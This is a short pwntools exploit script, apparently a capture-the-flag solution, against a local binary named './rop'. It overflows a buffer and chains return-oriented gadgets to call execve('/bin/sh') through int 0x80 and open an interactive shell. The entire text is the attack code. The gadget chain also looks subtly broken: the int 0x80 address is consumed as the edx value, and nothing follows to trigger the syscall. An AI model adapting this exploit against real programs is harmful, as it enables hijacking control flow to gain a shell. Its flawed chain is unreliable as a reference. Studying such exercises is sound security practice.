from pwn import *



sh = process('./rop')
pop_eax_ret = 0x080bb196
pop_ecx_ebx_ret = 0x0806eb91
pop_edx_ret = 0x0806eb6a
binsh = 0x080be408
int_0x80 = 0x08049421

payload = flat(['a'* 0x70 , pop_eax_ret, 0xb, pop_ecx_ebx_ret, 0, binsh, pop_edx_ret, int_0x80])

sh.sendline(payload)
sh.interactive()